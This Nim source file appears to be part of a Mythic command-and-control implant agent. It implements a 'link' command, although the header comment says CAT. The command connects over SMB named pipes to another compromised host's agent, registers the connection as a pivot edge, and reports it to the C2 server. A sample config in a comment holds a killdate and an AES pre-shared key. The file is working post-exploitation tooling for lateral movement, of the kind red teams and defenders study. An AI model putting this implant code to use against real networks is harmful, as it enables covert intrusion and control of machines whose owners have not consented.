# This is the source for the CAT command
import ../structs
import ../utils
import os
import json
import strutils
import winim/lean
import ../pivot/pivot
import std/options
import ../config

when defined(PROFILE_SMB):
  import ../profiles/smb as profile
else:
  import ../profiles/http as profile

type
  CryptInfo = object
    crypto_type: string
    enc_key: string
    dec_key: string
  C2ProfileParameters = object
    pipename: string
    killdate: string
    encrypted_exchange_check: string
    AESPSK: CryptInfo

  C2Profile = object
    name: string
    parameters: C2ProfileParameters

  ConInfo = object
    host: string
    agent_uuid: string
    c2_profile: C2Profile


#[
Short Command Description

{
  "connection_info": {
    "host": "DESKTOP-EJJAQHR",
    "agent_uuid": "07b4bc61-6d56-411b-aaff-4da9103e9df8",
    "c2_profile": {
      "name": "smb",
      "parameters": {
        "pipename": "naaaaaaaaaaaaaamedperperino",
        "killdate": "2023-09-27",
        "encrypted_exchange_check": "T",
        "AESPSK": {
          "crypto_type": "aes256_hmac",
          "enc_key": "wYLXWzVdsS5AytKSzBluuT7ZAI6E5h2Q1BKFLgM22Qg=",
          "dec_key": "wYLXWzVdsS5AytKSzBluuT7ZAI6E5h2Q1BKFLgM22Qg="
        }
      }
    }
  }
}

]#
proc cmd_link*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  let linkInfo = to(params["connection_info"], ConInfo)


  # Configure Output
  var
    output = ""
    hPipe = INVALID_HANDLE_VALUE
    status = ""

  # Do the Magic
  var pipeName = linkInfo.c2_profile.parameters.pipename
  var pipeFullName = ""

  if getHost().toLowerAscii() == linkInfo.host.toLowerAscii():
    pipeFullName = "\\\\.\\pipe\\" & pipeName
  else:
    pipeFullName = "\\\\" & linkInfo.host & "\\pipe\\" & pipeName


  DBG("[*] Connecting to NamedPipe: " & pipeFullName)
  const MAX_TRIES = 10
  var numTries = 0

  while hPipe == INVALID_HANDLE_VALUE and numTries <= MAX_TRIES:
    hPipe = CreateFile(T(pipeFullName), GENERIC_READ.or(GENERIC_WRITE), 0, cast[LPSECURITY_ATTRIBUTES](0), OPEN_EXISTING, SECURITY_SQOS_PRESENT or SECURITY_ANONYMOUS, 0 )
    sleep(50)
    numTries += 1

  # Abort if the limit was reached without an established connection
  if hPipe == INVALID_HANDLE_VALUE and numTries >= MAX_TRIES:
    status = "error"
    return buildReturnData(task.id, output, status)

  DBG("[+] Connected to Server")
  var mode: DWORD = PIPE_READMODE_MESSAGE or PIPE_NOWAIT
  if SetNamedPipeHandleState(hPipe, mode.addr, NULL, NULL) == FALSE:
    DBG("[-] Failed to change Pipe State")
    status = "error"


  # setup the PivotInformation to keep track
  # of the connection
  var newEdge = PivotInformation(
    source: connection.uuid,
    destination: linkInfo.agent_uuid,
    metadata: PipeMetadata(pipeName: pipeName, pipeHandle: hPipe),
    action: "add",
    c2_profile: linkInfo.c2_profile.name
  )

  activePivots.user_output = ""
  activePivots.task_id = task.id
  activePivots.edges.add(newEdge)

  DBG("[*] Sending new Edge to Mythic Server")

  var pr = TaskResponse(action: "post_response", responses: @[%*activePivots])
  let answer = sendAndRetrData(%*pr)

  if answer.isNone:
    DBG("[-] Failed to connect the new Pivot to the Server")
    status = "error"
  elif answer.isSome and answer.get()["responses"][0]["status"].getStr() != "success":
    DBG($answer.get())
    DBG("[-] Failed to connect the new Pivot to the Server")
    status = "error"

  # return the response
  return buildReturnData(task.id, output, status)

